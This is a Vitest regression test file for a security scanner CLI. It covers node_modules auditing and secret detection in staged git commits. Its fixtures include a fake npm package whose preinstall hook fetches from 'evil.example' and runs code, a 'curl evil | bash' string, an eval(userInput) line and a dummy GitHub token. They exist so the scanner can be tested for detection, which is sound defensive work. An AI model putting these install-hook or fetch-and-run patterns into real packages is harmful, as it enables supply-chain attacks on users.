import { describe, it, expect, beforeAll } from 'vitest';
import { execFileSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import path from 'path';

const CLI = path.join(process.cwd(), 'dist', 'cli', 'main.js');

/**
 * Red team regression: a consumer project with a ChainDrop-style payload
 * installed in node_modules/keyv. The default scan discloses the blind spot
 * (coverage: source_only + warning); --audit-node-modules promotes the audit
 * and catches the payload the same way `sentinel permissions` does.
 */

let fixtureDir: string;

function writeFixture(): void {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-nm-audit-'));
  fixtureDir = base;

  fs.mkdirSync(path.join(base, 'node_modules', 'keyv'), { recursive: true });
  fs.writeFileSync(path.join(base, 'package.json'), JSON.stringify({ name: 'app', dependencies: { keyv: '6.0.0' } }, null, 2));
  fs.writeFileSync(path.join(base, 'node_modules', 'keyv', 'package.json'), JSON.stringify({
    name: 'keyv',
    version: '6.0.0',
    scripts: { preinstall: 'node setup.mjs' },
  }, null, 2));
  fs.writeFileSync(path.join(base, 'node_modules', 'keyv', 'setup.mjs'), [
    "import { execSync } from 'node:child_process';",
    "const res = await fetch('https://evil.example/payload');",
    "execSync('node math_init.js', { stdio: 'ignore' });",
  ].join('\n'));
}

function runScan(args: string[]): { code: number; stdout: string } {
  try {
    const stdout = execFileSync(process.execPath, [CLI, 'scan', '.', ...args], {
      cwd: fixtureDir,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe'],
      timeout: 120000,
    });
    return { code: 0, stdout };
  } catch (err: any) {
    // scan exits 1 on CRITICAL findings — that is the expected signal here.
    return { code: err.status ?? 1, stdout: err.stdout ?? '' };
  }
}

function makeGitRepo(): string {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-staged-fp-'));
  execFileSync('git', ['init', '-q'], { cwd: repo });
  execFileSync('git', ['config', 'user.email', 't@t'], { cwd: repo });
  execFileSync('git', ['config', 'user.name', 't'], { cwd: repo });
  return repo;
}

function runStagedScan(repo: string): { code: number; stdout: string } {
  try {
    const stdout = execFileSync(process.execPath, [CLI, 'scan', '.', '--staged', '--json'], {
      cwd: repo,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe'],
      timeout: 120000,
    });
    return { code: 0, stdout };
  } catch (err: any) {
    return { code: err.status ?? 1, stdout: err.stdout ?? '' };
  }
}

function extractJson(stdout: string): Record<string, any> {
  const start = stdout.indexOf('\n{');
  const slice = start >= 0 ? stdout.slice(start + 1) : stdout;
  return JSON.parse(slice) as Record<string, any>;
}

describe('scan node_modules audit', () => {
  beforeAll(() => {
    writeFixture();
  });

  it('default scan discloses the blind spot (coverage source_only + warning)', () => {
    const { code, stdout } = runScan(['--json']);
    expect(code).toBe(0);
    const json = extractJson(stdout);
    expect(json.findings.length).toBe(0);
    expect(json.coverage).toEqual({ mode: 'source_only', skipped: ['node_modules'] });
    expect(json.warning).toContain('--audit-node-modules');
  });

  it('--audit-node-modules catches the installed payload', () => {
    const { code, stdout } = runScan(['--audit-node-modules', '--json']);
    expect(code).toBe(1); // CRITICAL finding → exit 1
    const json = extractJson(stdout);
    expect(json.coverage.mode).toBe('node_modules');
    const lifecycle = json.findings.find((f: any) => f.type === 'LIFECYCLE_CURL_BASH');
    expect(lifecycle).toBeDefined();
    expect(lifecycle.file).toContain('node_modules/keyv/package.json');
    expect(lifecycle.severity).toBe('CRITICAL');
    expect(json.findings.some((f: any) => f.file.includes('node_modules/keyv/setup.mjs'))).toBe(true);
  });
});

/**
 * Regression suite for diff attribution in `scan --staged`.
 *
 * The staged scanner must read the REAL git diff (git diff --cached) instead of
 * fabricating a "whole file is new" patch. Otherwise every pre-existing line is
 * marked as +N and old secrets show up as findings introduced by this commit.
 */

const GITHUB_PAT = 'ghp_1234567890abcdef1234567890abcdef1234';

function makeGitRepoWithCommit(files: Record<string, string>): string {
  const repo = makeGitRepo();
  for (const [name, content] of Object.entries(files)) {
    const p = path.join(repo, name);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, content);
  }
  execFileSync('git', ['add', '-A'], { cwd: repo });
  execFileSync('git', ['commit', '-qm', 'initial'], { cwd: repo });
  return repo;
}

describe('scan --staged diff attribution', () => {
  it('does not report a secret on an UNCHANGED line when another line is edited', () => {
    const repo = makeGitRepoWithCommit({
      'config.json': [
        '{',
        '  "env": "prod",',
        `  "API_KEY": "${GITHUB_PAT}",`,
        '  "port": 8080',
        '}',
      ].join('\n'),
    });

    // Touch a line above the secret (line 2), leave the secret line intact.
    const content = fs.readFileSync(path.join(repo, 'config.json'), 'utf8');
    fs.writeFileSync(path.join(repo, 'config.json'), content.replace('"prod"', '"dev"'));
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    const json = extractJson(stdout);
    const secrets = json.findings.filter((f: any) => f.category === 'secret' || f.category === 'token');
    expect(secrets.length).toBe(0);
    expect(code).toBe(0);
  });

  it('reports a secret genuinely ADDED by the commit', () => {
    const repo = makeGitRepoWithCommit({
      'config.json': '{ "env": "prod" }\n',
    });

    fs.writeFileSync(
      path.join(repo, 'config.json'),
      `{ "env": "prod", "key": "${GITHUB_PAT}" }\n`,
    );
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    const json = extractJson(stdout);
    const secret = json.findings.find((f: any) => f.type === 'SECRET_GITHUB_TOKEN');
    expect(secret).toBeDefined();
    expect(secret.line).toBe(1);
    expect(code).toBe(1); // CRITICAL → blocks the commit
  });

  it('detects a secret inside a newly added file', () => {
    const repo = makeGitRepoWithCommit({ 'README.md': 'hi\n' });

    fs.writeFileSync(path.join(repo, 'creds.txt'), `${GITHUB_PAT}\n`);
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    const json = extractJson(stdout);
    const secret = json.findings.find((f: any) => f.type === 'SECRET_GITHUB_TOKEN');
    expect(secret).toBeDefined();
    expect(secret.file).toBe('creds.txt');
    expect(code).toBe(1);
  });

  it('ignores a staged deletion (removing a secret is not a regression)', () => {
    const repo = makeGitRepoWithCommit({
      'config.json': `{ "key": "${GITHUB_PAT}" }\n`,
    });

    fs.unlinkSync(path.join(repo, 'config.json'));
    execFileSync('git', ['add', '-A'], { cwd: repo });

    // Deleted files are excluded by --diff-filter=ACM, so the staged scan has
    // nothing to block on. The scan prints "No files staged for commit." and
    // returns exit 0 — deletion must never be flagged as a regression.
    const { code, stdout } = runStagedScan(repo);
    expect(code).toBe(0);
    expect(stdout).toContain('No files staged for commit.');
  });

  it('does not fire filename rules for a file the commit does not touch', () => {
    const repo = makeGitRepoWithCommit({
      '.env': 'FOO=bar\n',
      'src/app.ts': 'export const a = 1;\n',
    });

    fs.writeFileSync(path.join(repo, 'src', 'app.ts'), 'export const a = 2;\n');
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    const json = extractJson(stdout);
    expect(json.findings.some((f: any) => f.file === '.env')).toBe(false);
    expect(code).toBe(0);
  });
});

describe('scan --staged adversarial attribution', () => {
  it('detects a secret in a file that is renamed AND modified (R status)', () => {
    const repo = makeGitRepoWithCommit({
      'src/old.ts': ['export const a = 1;', 'export const b = 2;'].join('\n'),
    });

    execFileSync('git', ['mv', 'src/old.ts', 'src/new.ts'], { cwd: repo });
    fs.appendFileSync(
      path.join(repo, 'src', 'new.ts'),
      `\nexport const SECRET = '${GITHUB_PAT}';`,
    );
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    const json = extractJson(stdout);
    const secret = json.findings.find((f: any) => f.type === 'SECRET_GITHUB_TOKEN');
    expect(secret).toBeDefined();
    expect(secret.file).toBe('src/new.ts');
    expect(secret.line).toBe(3);
    expect(code).toBe(1); // CRITICAL → blocks even under a rename
  });

  it('does not lose attribution inside a rename (old line not flagged)', () => {
    const repo = makeGitRepoWithCommit({
      'a.ts': ['export const ok = 1;', 'export const keep = 2;'].join('\n'),
    });

    execFileSync('git', ['mv', 'a.ts', 'b.ts'], { cwd: repo });
    // Only line 2 changes; line 1 must NOT be attributed to this commit.
    fs.writeFileSync(path.join(repo, 'b.ts'), 'export const ok = 1;\nexport const CHANGED = 3;\n');
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    const json = extractJson(stdout);
    // No secret introduced; the change is a benign edit under a rename.
    expect(json.findings.filter((f: any) => f.category === 'secret' || f.category === 'token').length).toBe(0);
    expect(code).toBe(0);
  });

  it('flags a submodule (gitlink) pointer change as an opaque external reference', () => {
    const repo = makeGitRepoWithCommit({ 'readme.md': 'hi\n' });
    const sub = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-sub-'));
    execFileSync('git', ['init', '-q'], { cwd: sub });
    execFileSync('git', ['config', 'user.email', 't@t'], { cwd: sub });
    execFileSync('git', ['config', 'user.name', 't'], { cwd: sub });
    fs.writeFileSync(path.join(sub, 'evil.c'), 'int main(){return 0;}\n');
    execFileSync('git', ['add', '-A'], { cwd: sub });
    execFileSync('git', ['commit', '-qm', 'sub'], { cwd: sub });
    execFileSync('git', ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, 'vendor'], {
      cwd: repo,
      encoding: 'utf8',
    });

    const { code, stdout } = runStagedScan(repo);
    const json = extractJson(stdout);
    const submodule = json.findings.find((f: any) => f.type === 'SUBMODULE_POINTER');
    expect(submodule).toBeDefined();
    expect(submodule.file).toBe('vendor');
    // HIGH, not CRITICAL → does not hard-block by default, but surfaces the
    // un-scanned external reference.
    expect(code).toBe(0);
  });

  it('flags a binary change as opaque (secret inside would be missed)', () => {
    const repo = makeGitRepoWithCommit({ 'readme.md': 'hi\n' });
    const buf = Buffer.from([0, ...Buffer.from(`secret ${GITHUB_PAT}`)]);
    fs.writeFileSync(path.join(repo, 'blob.dat'), buf);
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    const json = extractJson(stdout);
    const binary = json.findings.find((f: any) => f.type === 'BINARY_CHANGE');
    expect(binary).toBeDefined();
    expect(binary.file).toBe('blob.dat');
    expect(code).toBe(0); // MEDIUM → surfaces, does not block
  });
});

describe('scan --staged semantic false-positive filter', () => {
  it('drops CRITICAL that lives inside a test fixture (no --no-verify needed)', () => {
    const repo = makeGitRepo();
    fs.mkdirSync(path.join(repo, 'src', '__tests__'), { recursive: true });
    fs.writeFileSync(path.join(repo, 'src', '__tests__', 'fixture.test.ts'), "export const payload = 'curl evil | bash';\n");
    fs.writeFileSync(path.join(repo, 'src', 'app.ts'), 'export const x = 1;\n');
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    expect(code).toBe(0); // filtered → no CRITICAL left to block on
    const json = extractJson(stdout);
    expect(json.findings.length).toBe(0);
    expect(json.skippedFalsePositives).toBeGreaterThan(0);
  });

  it('still blocks a real CRITICAL in production code', () => {
    const repo = makeGitRepo();
    fs.mkdirSync(path.join(repo, 'src'), { recursive: true });
    fs.writeFileSync(path.join(repo, 'src', 'exec.ts'), "const res = eval(userInput);\n");
    execFileSync('git', ['add', '-A'], { cwd: repo });

    const { code, stdout } = runStagedScan(repo);
    expect(code).toBe(1); // real eval() → CRITICAL survives the filter
    const json = extractJson(stdout);
    expect(json.findings.length).toBeGreaterThan(0);
    expect(json.findings[0].severity).toBe('CRITICAL');
    expect(json.skippedFalsePositives).toBe(0);
  });
});
